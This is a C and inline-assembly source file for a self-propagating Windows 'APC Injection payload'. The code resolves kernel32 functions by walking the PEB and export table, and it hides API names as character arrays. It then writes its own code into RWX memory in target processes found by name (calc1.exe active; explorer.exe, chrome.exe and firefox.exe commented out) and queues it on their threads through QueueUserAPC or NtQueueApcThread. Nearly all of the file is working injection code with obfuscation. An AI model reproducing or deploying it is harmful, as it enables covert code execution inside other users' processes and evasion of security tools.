/*  -----------------------------------------------------------------------
                            APC Injection payload                
    -----------------------------------------------------------------------   
    Note: The payload does not take any arguments
*/


#include "stdafx.h"
#include "headers.h"
#include "exe_header.h"

#ifdef __SELF_INJECTION__
#include <iostream>
#endif

#define B(a)                               { _emit a }
#define W(a,b)                             { _emit a }{ _emit b }
#define D(a,b,c,d)                         { _emit a }{ _emit b }{ _emit c }{ _emit d }
#define Q(a,b,c,d,e,f,g,h)                 D(a,b,c,d) D(e,f,g,h)
#define O(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p) Q(a,b,c,d,e,f,g,h) Q(i,j,k,l,m,n,o,p)

#ifdef __USE_NT_FUNCTIONS__
__declspec(safebuffers) void __stdcall executer(LPVOID parameter, LPVOID pra2, LPVOID para3){
#else
__declspec(safebuffers) void __stdcall executer(ULONG parameter){
#endif
    ULONG EXE_SIZE = (ULONG)parameter;

    /* proc name */
#ifdef __SELF_INJECTION__
    char procList[] = {
        'S','e','l','f','Q','u','e','u','i','n','g','.','e','x','e',0,0,1,
        0
        };
#else
    /* list of processses to attempt APC Queuing.
       "process name\0", <Thread no to start queueing from>, <No of threads to queue>
       list ends is specified by a 0
       i.e. if a process name is found to start with 0, it is considered as end of list.
    */
    char procList[] = {
        //'e','x','p','l','o','r','e','r','.','e','x','e',0,0,10,
        //'c','h','r','o','m','e','.','e','x','e',0,3,1,
        //'c','h','r','o','m','e','.','e','x','e',0,0,10,
        //'f','i','r','e','f','o','x','.','e','x','e',0,2,5,
        //'c','a','l','c','.','e','x','e',0,3,1,
        'c','a','l','c','1','.','e','x','e',0,0,5,
        0};
#endif
    
    /* strings */
    char msg1[MAX_ONE_TIME_LOG_SIZE];
    char msg2[MAX_ONE_TIME_LOG_SIZE];
    char message[] = {'m','e','s','s','a','g','e',0};
    char title[] = {'t','i','t','l','e',0};
    char __pid_tid[] = {'p','i','d',':',' ','%','d',';','\n','t','i','d',':',' ','%','d','\n',0};
    char __pid_addr[] = {'I','n','j','e','c','t','e','d',' ','t','o','\n',
        'p','i','d',':',' ','%','d','\n',
        'A','d','r','r',':',' ','0','x','%','x','\n',0};
	char __started_pid_tid[] = {
		's','t','a','r','t','e','d',' ','i','n',' ','p','i','d',' ','%','d',' ','t','i','d',' ','%','d','\n',0
	};
	char __injecting_to_at[] = {
		'i','n','j','e','c','t','i','n','g',' ','t','o',' ','%','d','(','t','i','d',':',' ','%','d',')',' ','a','t',' ','0','x','%','x','\n',0
	};
    char __from_pid[] = {'F','r','o','m',':',' ','%','d','\n',0};
    char sharedMemName[] = {'S','Q','S','h','a','r','e','d','M','e','m','$','$','$',0};
#ifdef __LOG__
    char __logFile[] = {'C',':','\\','U','s','e','r','s','\\','t','e','s','t','e','r','\\',
        'A','p','p','D','a','t','a','\\','L','o','c','a','l','\\','T','e','m','p','\\',
        's','e','l','f','Q','u','e','u','i','n','g','L','o','g','.','t','x','t',0};
#endif

    /* DLL names */
    char __User32_dll[] = {'U','s','e','r','3','2','.','d','l','l',0};
	char __ntdll_dll[] = {'n','t','d','l','l','.','d','l','l',0};

    /* kernel32.dll function names */
    char __LoadLibraryA[] = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
    char __GetProcAddress[] = {'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0};
    char __GetCurrentProcessId[] = {'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s','I','d',0};
    char __GetCurrentThreadId[] = {'G','e','t','C','u','r','r','e','n','t','T','h','r','e','a','d','I','d',0};
    char __CreateToolhelp32Snapshot[] = {'C','r','e','a','t','e','T','o','o','l','h','e','l','p','3','2','S','n','a','p','s','h','o','t',0};
    char __Process32First[] = {'P','r','o','c','e','s','s','3','2','F','i','r','s','t',0};
    char __OpenProcess[] = {'O','p','e','n','P','r','o','c','e','s','s',0};
    char __VirtualAllocEx[] = {'V','i','r','t','u','a','l','A','l','l','o','c','E','x',0};
    char __WriteProcessMemory[] = {'W','r','i','t','e','P','r','o','c','e','s','s','M','e','m','o','r','y',0};
    char __Thread32First[] = {'T','h','r','e','a','d','3','2','F','i','r','s','t',0};
    char __OpenThread[] = {'O','p','e','n','T','h','r','e','a','d',0};
    char __QueueUserAPC[] = {'Q','u','e','u','e','U','s','e','r','A','P','C',0};
    char __VirtualFreeEx[] = {'V','i','r','t','u','a','l','F','r','e','e','E','x',0};
    char __Thread32Next[] = {'T','h','r','e','a','d','3','2','N','e','x','t',0};
    char __Process32Next[] = {'P','r','o','c','e','s','s','3','2','N','e','x','t',0};
    char __MapViewOfFile[] = {'M','a','p','V','i','e','w','O','f','F','i','l','e',0};
    char __OpenFileMappingA[] = {'O','p','e','n','F','i','l','e','M','a','p','p','i','n','g','A',0};
    char __lstrcmpA[] = {'l','s','t','r','c','m','p','A',0};
    char __CloseHandle[] = {'C','l','o','s','e','H','a','n','d','l','e',0};
    char __CreateFileA[] = {'C','r','e','a','t','e','F','i','l','e','A',0};
    char __SetFilePointer[] = {'S','e','t','F','i','l','e','P','o','i','n','t','e','r',0};
	char __LockFile[] = {'L','o','c','k','F','i','l','e',0};
	char __WriteFile[] = {'W','r','i','t','e','F','i','l','e',0};
	char __lstrlenA[] = {'l','s','t','r','l','e','n','A',0};
	char __UnlockFile[] = {'U','n','l','o','c','k','F','i','l','e',0};

    /* User32.dll  function names */
    char __MessageBoxA[] = {'M','e','s','s','a','g','e','B','o','x','A',0};
    char __wsprintfA[] = {'w','s','p','r','i','n','t','f','A',0};

	/* ntdll.dll functions */
	char __NtQueueApcThread[] = {'N','t','Q','u','e','u','e','A','p','c','T','h','r','e','a','d',0};

    /* kernel32.dll function declarations */
    HMODULE (__stdcall *LoadLibraryA)               (char*)                                     ;
    void*   (__stdcall *GetProcAddress)             (void*, char*)                              ;
    DWORD   (__stdcall *GetCurrentProcessId)        ()                                          ;
    DWORD   (__stdcall *GetCurrentThreadId)         ()                                          ;
    HANDLE  (__stdcall *CreateToolhelp32Snapshot)   (DWORD, DWORD)                              ;
    BOOL    (__stdcall *Process32First)             (void*, LPPROCESSENTRY32)                   ;
    HANDLE  (__stdcall *OpenProcess)                (DWORD, BOOL, DWORD)                        ;
    LPVOID  (__stdcall *VirtualAllocEx)             (HANDLE, LPVOID, SIZE_T, DWORD, DWORD)      ;
    BOOL    (__stdcall *WriteProcessMemory)         (HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T)   ;
    BOOL    (__stdcall *Thread32First)              (HANDLE, LPTHREADENTRY32)                   ;
    HANDLE  (__stdcall *OpenThread)                 (DWORD, BOOL, DWORD)                        ;
    DWORD   (__stdcall *QueueUserAPC)               (PAPCFUNC, HANDLE, ULONG_PTR)               ;
    BOOL    (__stdcall *VirtualFreeEx)              (HANDLE, LPVOID, SIZE_T, DWORD)             ;
    BOOL    (__stdcall *Thread32Next)               (HANDLE, LPTHREADENTRY32)                   ;
    BOOL    (__stdcall *Process32Next)              (HANDLE, LPPROCESSENTRY32)                  ;
    LPVOID  (__stdcall *MapViewOfFile)              (HANDLE, DWORD, DWORD, DWORD, SIZE_T)       ;
    HANDLE  (__stdcall *OpenFileMappingA)           (DWORD, BOOL, LPCTSTR)                      ;
    int     (__stdcall *lstrcmpA)                   (LPCSTR, LPCSTR)                            ;
    BOOL    (__stdcall *CloseHandle)                (HANDLE)                                    ;
    HANDLE  (__stdcall *CreateFileA)                (LPCSTR, DWORD, DWORD,
                                                    LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    DWORD   (__stdcall *SetFilePointer)             (HANDLE, LONG, PLONG, DWORD)                ;
    BOOL	(__stdcall *LockFile)					(HANDLE, DWORD, DWORD, DWORD, DWORD)		;
	BOOL	(__stdcall *WriteFile)					(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
	int		(__stdcall *lstrlenA)					(LPCSTR)									;
	BOOL	(__stdcall *UnlockFile)					(HANDLE, DWORD, DWORD, DWORD, DWORD)		;

    /* User32.dll function declarations */
    int     (__stdcall *MessageBoxA)                (HWND, LPCTSTR, LPCTSTR, UINT)              ;
    int     (__stdcall *wsprintfA)                  (LPSTR, LPCSTR, ... )                       ;

	/* ntdll.dll functions */
	int		(NTAPI *NtQueueApcThread)			(HANDLE, LPVOID, LPVOID, LPVOID, LPVOID)	;

	__asm{
        jmp init
    }
    __asm {
        //-------------------------------------------------------------------------------------------------------
        // getprocaddr(): An inline implementation of kernel32.dll GetProcAddress() function. getprocaddr() lookup
        //      a function in kernel32's EAT. The search is done by name, and the entry point of the requested 
        //      function is returned. If function not found, function returns -1.
        //
        // Arguments (fastcall): ecx (char*) : a pointer to the requested function name
        //
        // Return Value: Function address. If function not found, -1 is returned.
        //-------------------------------------------------------------------------------------------------------
        getprocaddr:                                    // function label
            push    ebp                                 // create a stack frame
            mov     ebp, esp                            //
            sub     esp, 0x20                           // 32 bytes seem enough
            push    ebx                                 // backup registers
            push    edx                                 //
            push    esi                                 //
            push    edi                                 //
                                                        //
            mov     [ebp-4], ecx                        // loc4 = arg1
            // --------------------------------------------------------------------------
            // find length of user's function name
            // --------------------------------------------------------------------------
            xor     eax, eax                            // set al to NULL
            mov     edi, ecx                            // edi must contain the string address
            xor     ecx, ecx                            //
            not     ecx                                 // set ecx to -1
            cld                                         // clear Direction Flag (++ mode)
            repne scasb                                 // iterate over string until you find NULL
            neg     ecx                                 // toggle, and ecx will contain strlen+2 (+2 is needed)
                                                        //
            mov     [ebp-8], ecx                        // loc8 = strlen(arg1)
            // --------------------------------------------------------------------------
            // locate base address of kernel32.dll (generic - without InInitializationOrderModuleList)
            // --------------------------------------------------------------------------
            mov     eax, fs:[0x30]                      // get PEB
            mov     eax, [eax + 0x0c]                   // PEB->Ldr (PEB_LDR_DATA)
            mov     eax, [eax + 0x14]                   // PEB->Ldr.InMemoryOrderModuleList.Flink
            mov     eax, [eax]                          // skip 1st entry (module itsel)
            mov     eax, [eax]                          // skip 2nd entry (ntdll.dll)
            mov     ebx, [eax + 0x10]                   // kernel32 module base address in ebx
            // mov      [ebp - 1c], ebx                 // base address in stack
            // --------------------------------------------------------------------------
            // locate important parts of kernel32's EAT
            // --------------------------------------------------------------------------
            mov     ecx, [ebx + 0x3c]                   // ebx->e_lfanew: skip MSDOS header of kernel32.dll 
            mov     edx, [ebx + ecx + 78h]              // get export table RVA (it's 0x78 bytes after PE header)
            add     edx, ebx                            // convert it to absolute address (edx = EAT)
                                                        //
            mov     ecx, [edx + 0x18]                   // get number of exported functions
            mov     esi, [edx + 0x1c]                   // & of AddressOfNamess table
            mov     edi, [edx + 0x24]                   // & of AddressOfNameOrdinals table
            mov     edx, [edx + 0x20]                   // & of AddressOfFunctions table
            add     edx, ebx                            // convert it to absolute address
                                                        //
            mov     [ebp - 0xc], esi                    // locc  = &AddressOfNames
            mov     [ebp - 0x10], edi                   // loc10 = &AddressOfNameOrdinals
            // --------------------------------------------------------------------------
            // iterate over EAT until you find the requested function
            // --------------------------------------------------------------------------
        get_next_funnam:                                //
            jecxz   search_failed                       // reach the end of table?
            dec     ecx                                 // decrease counter
            mov     esi, [edx + ecx*4]                  // get function's name RVA
            add     esi, ebx                            // convert it to absolute address
            // --------------------------------------------------------------------------
            // compare the 2 strings
            // --------------------------------------------------------------------------
            push    ecx                                 // back up ecx
            xor     eax, eax                            // clear eax
            mov     edi, [ebp - 4]                      // edi = arg1
            mov     ecx, [ebp - 8]                      // ecx = strlen(arg1)
            dec     esi                                 // 
            dec     edi                                 // decrease, because we'll increase later
        strcmp_loop:                                    //
            inc     esi                                 // funnam++
            inc     edi                                 // arg1++
                                                        //
            mov     al, byte ptr [esi]                  // 
            cmp     al, byte ptr [edi]                  // *funnam == *arg1 ?
            loope   strcmp_loop                         // if yes get next character
                                                        //
            test    ecx, ecx                            // reach NULL ? (we need to compare also the NULL bytes)
            pop     ecx                                 // restore old ecx
            jne     get_next_funnam                     // if match not found, get next funnam from EAT
            // --------------------------------------------------------------------------
            // if you reach this point, match found
            // --------------------------------------------------------------------------
            mov     edx, [ebp-0x10]                     // &AddressOfNameOrdinals
            add     edx, ebx                            // convert it to absolute address
            shl     ecx, 1                              // counter *= 2 (because ordinals are 2 bytes)
            add     edx, ecx                            //
            movzx   ecx, word ptr[edx]                  // ecx = AddressOfNameOrdinals[counter << 1]
                                                        // ecx has the right ordinal
            mov     esi, [ebp-0xc]                      // &AddressOfNames
            add     esi, ebx                            // convert it to absolute address
            shl     ecx, 2                              // because addresses are 4 bytes
            add     esi, ecx                            // get the right slot
            mov     eax, [esi]                          // AddressOfNames[ AddressOfNameOrdinals[counter*2]*4 ]
            add     eax, ebx                            // convert from RVA to absolute address
            jmp     getprocaddr_end                     // return
            // --------------------------------------------------------------------------
            // finalize
            // --------------------------------------------------------------------------
        search_failed:                                  //
            mov     eax, 0xffffffff                     // return -1
        getprocaddr_end:                                //
            pop     edi                                 // restore registers
            pop     esi                                 //
            pop     edx                                 //
            pop     ebx                                 //
            add     esp, 0x20                           // release stack space
            leave                                       // function epilog
            retn                                        //
    }
    __asm{
        init:
            lea     ecx, [__LoadLibraryA]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[LoadLibraryA], eax        // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort

            lea     ecx, [__GetProcAddress]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[GetProcAddress], eax      // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
            
            lea     ecx, [__GetCurrentProcessId]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[GetCurrentProcessId], eax // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort

            lea     ecx, [__GetCurrentThreadId]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[GetCurrentThreadId], eax  // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
            
            lea     ecx, [__CreateToolhelp32Snapshot]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[CreateToolhelp32Snapshot], eax  // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
            
            lea     ecx, [__Process32First]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[Process32First], eax      // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
            
            lea     ecx, [__OpenProcess]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[OpenProcess], eax         // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
            
            lea     ecx, [__VirtualAllocEx]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[VirtualAllocEx], eax      // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
            
            lea     ecx, [__WriteProcessMemory]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[WriteProcessMemory], eax  // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
            
            lea     ecx, [__Thread32First]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[Thread32First], eax       // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
            
            lea     ecx, [__OpenThread]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[OpenThread], eax          // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
            
            lea     ecx, [__QueueUserAPC]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[QueueUserAPC], eax        // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
            
            lea     ecx, [__VirtualFreeEx]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[VirtualFreeEx], eax       // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
            
            lea     ecx, [__Thread32Next]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[Thread32Next], eax        // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
            
            lea     ecx, [__Process32Next]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[Process32Next], eax       // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
            
            lea     ecx, [__MapViewOfFile]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[MapViewOfFile], eax       // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
            
            lea     ecx, [__OpenFileMappingA]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[OpenFileMappingA], eax    // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
            
            lea     ecx, [__lstrcmpA]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[lstrcmpA], eax            // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
            
            lea     ecx, [__CloseHandle]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[CloseHandle], eax         // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
            
            lea     ecx, [__CreateFileA]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[CreateFileA], eax          // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
			
            lea     ecx, [__SetFilePointer]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[SetFilePointer], eax      // set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
			
            lea     ecx, [__LockFile]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[LockFile], eax			// set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
			
            lea     ecx, [__WriteFile]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[WriteFile], eax			// set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort
			
            lea     ecx, [__lstrlenA]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[lstrlenA], eax			// set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort

            lea     ecx, [__UnlockFile]
            call    getprocaddr                         // fastcall calling convention
            mov     dword ptr[UnlockFile], eax			// set function pointer
            cmp     eax, 0xffffffff                     // error?
            je      exit_fn                             // in case of error, abort

            jmp     main
    }
    __asm{
        main:
            nop
    }
	/* Loading ntdll.dll functions */
	HMODULE hNtdll = LoadLibraryA(__ntdll_dll);
	NtQueueApcThread = (int(__stdcall *)(HANDLE, LPVOID, LPVOID, LPVOID, LPVOID)) GetProcAddress(hNtdll, __NtQueueApcThread);
	if(NtQueueApcThread==NULL) { __asm{ jmp exit_fn } }

    HMODULE module = LoadLibraryA(__User32_dll);
    MessageBoxA = (int (__stdcall *)(HWND, LPCTSTR, LPCTSTR, UINT)) GetProcAddress(module, __MessageBoxA);
    wsprintfA = (int (__stdcall *)(LPSTR, LPCSTR, ...   )) GetProcAddress(module, __wsprintfA);

#ifdef __LOG__
    wsprintfA(msg1, __started_pid_tid, GetCurrentProcessId(), GetCurrentThreadId());
#ifdef __LOG_BY_MESSAGE__
    wsprintfA(msg2, __from_pid, GetCurrentProcessId());
	//MessageBoxA(NULL, msg1, msg2, 0x00000000L);           // msg1: message, msg2: title
#else
    HANDLE logFile = CreateFile(
        __logFile,
        FILE_APPEND_DATA,         // open for writing
        FILE_SHARE_READ,          // allow multiple readers
        NULL,                     // no security
        OPEN_ALWAYS,              // open or create
        FILE_ATTRIBUTE_NORMAL,    // normal file
        NULL);                    // no attr. template
    DWORD dwPos = SetFilePointer(logFile, 0, NULL, FILE_END);
    //LockFile(logFile, dwPos, 0, MAX_ONE_TIME_LOG_SIZE , 0);
    DWORD dwBytesWritten;
    WriteFile(logFile, msg1, lstrlenA(msg1), &dwBytesWritten, NULL);
    //UnlockFile(logFile, dwPos, 0, MAX_ONE_TIME_LOG_SIZE, 0);
    CloseHandle(logFile);
#endif
#endif

    /*---------------------------------------------------------------------------------*
     *                              QUEUE APC FUNCTION                                 *
     *-------------------------------------------------------------------------------- */
    /* find own code */
    HANDLE hMapFile;
    LPCTSTR EXECUTER;
    hMapFile = OpenFileMappingA(
                      FILE_MAP_ALL_ACCESS,              // read/write access
                      FALSE,                            // do not inherit the name
                      sharedMemName);                   // name
    if (hMapFile == NULL)   __asm{ jmp exit_fn }        // exit if OpenFileMappingA Failed
    EXECUTER = (LPTSTR) MapViewOfFile(hMapFile,         // handle to map object
                                FILE_MAP_ALL_ACCESS,    // read/write permission
                                0,
                                0,
                                EXE_SIZE);
    if(EXECUTER==NULL)  __asm{ jmp exit_fn }            // exit if MapViewOfFile Failed

    /* find process */
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);  // 6:TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD
    /* not interested in any sanity checks :P
    if (hSnapshot == -1) // -1: INVALID_HANDLE_VALUE
        return false;
    */
    PROCESSENTRY32 pe;                                      // doing "TYPE pe = {sizeof(pe)};"
    pe.dwSize = sizeof(PROCESSENTRY32);                     //      result in call to memset by it's
                                                            //      absolute addr.
    if (Process32First(hSnapshot, &pe)) {
        int inject_count = 0;
        do {
            if(inject_count>0) break;
            for(char *procName = procList;  procName[0] != 0;  procName++){
                if (lstrcmpA(pe.szExeFile, procName) == 0) {
                    while(procName[0]!=0) procName++;
                    int START = (int)(*(++procName));
                    int QUEUE_COUNT = (int)(*(++procName));
                    /* process found, now write the emulator in it */
                    HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pe.th32ProcessID);
                    if(hProcess==NULL){                         // exit if OpenProcess Failed
                        __asm{ jmp exit_fn }
                    }
                    LPVOID p = VirtualAllocEx(hProcess, NULL, EXE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    if(p==NULL) {                               // exit if VirtualAllocEx Failed
                        __asm{ jmp exit_fn }
                    }
                    if(WriteProcessMemory(hProcess, p, EXECUTER, EXE_SIZE, NULL)==0){
                        __asm{ jmp exit_fn }                    // exit if WriteProcessMemeory Failed
                    }

                    /* Emulator wriiten to victim proc, now queue apc in threads */
                    THREADENTRY32 te;                           // doing "TYPE te = {sizeof(te)};"
                    te.dwSize = sizeof(THREADENTRY32);          //      result in call to memset by it's
                                                                //      absolute addr.
                    int thread_count = -1;
                    if (Thread32First(hSnapshot, &te)) {
                        do {
                            if (te.th32OwnerProcessID == pe.th32ProcessID) {
                                thread_count++;
                                if(thread_count < START){ continue; }       // Exclude the main threads
                                if(thread_count-START >= QUEUE_COUNT ){ break; }    // Limit the number of APC Queues

								#ifdef __LOG__
									wsprintfA(msg1, __injecting_to_at, pe.th32ProcessID, te.th32ThreadID, p);
								#ifdef __LOG_BY_MESSAGE__
									wsprintfA(msg2, __from_pid, GetCurrentProcessId());
									//MessageBoxA(NULL, msg1, msg2, 0x00000000L);           // msg1: message, msg2: title
								#else
									HANDLE logFile = CreateFile(
										__logFile,
										FILE_APPEND_DATA,         // open for writing
										FILE_SHARE_READ,          // allow multiple readers
										NULL,                     // no security
										OPEN_ALWAYS,              // open or create
										FILE_ATTRIBUTE_NORMAL,    // normal file
										NULL);                    // no attr. template
									DWORD dwPos = SetFilePointer(logFile, 0, NULL, FILE_END);
									//LockFile(logFile, dwPos, 0, MAX_ONE_TIME_LOG_SIZE , 0);
									DWORD dwBytesWritten;
									WriteFile(logFile, msg1, lstrlenA(msg1), &dwBytesWritten, NULL);
									//UnlockFile(logFile, dwPos, 0, MAX_ONE_TIME_LOG_SIZE, 0);
									CloseHandle(logFile);
								#endif
								#endif __LOG__                  
                                //MessageBoxA(NULL, msg1, msg2, 0);           // msg1: message, msg2: title

								/* INJECT */
                                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                                ULONG_PTR parameter = EXE_SIZE;             //nothing arguments to APC function!
    #ifdef __SELF_INJECTION__
                                p = executer;
    #endif
                                if (hThread!=NULL) {
#ifdef __USE_NT_FUNCTIONS__
                                    if(NtQueueApcThread(
                                        (PAPCFUNC)p,
                                        hThread, 
                                        (PVOID)parameter,
										0,
										0)==0){
#else
									if(QueueUserAPC(
                                        (PAPCFUNC)p,
                                        hThread, 
                                        parameter
										)==0){
#endif
                                        __asm{ jmp exit_fn }            // exit if QueueUserAPC Failed
                                    }
                                    inject_count++;
                                }
                                else{
                                    __asm{ jmp exit_fn }                // exit if OpenThread Failed
                                }
                            }
                        } while (Thread32Next(hSnapshot, &te));
                    }
                }
                else{
                    while(procName[0]!=0) procName++;
                    ++procName;
                    ++procName;
                }
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    // VirtualFreeEx(hProc, p, 0, MEM_RELEASE | MEM_DECOMMIT);
    CloseHandle(hSnapshot);

    __asm{
            jmp     exit_fn         // APC Queued, now exit
                                    // just being verbose :P
    }
    __asm{
            nop
        exit_fn:
            nop
    }
    return;
    /* Signature to identify end of executer */
    __asm {
        O('S','e','l','f','Q','u','e','u','i','n','g','$','$','$',0,0)
    }
}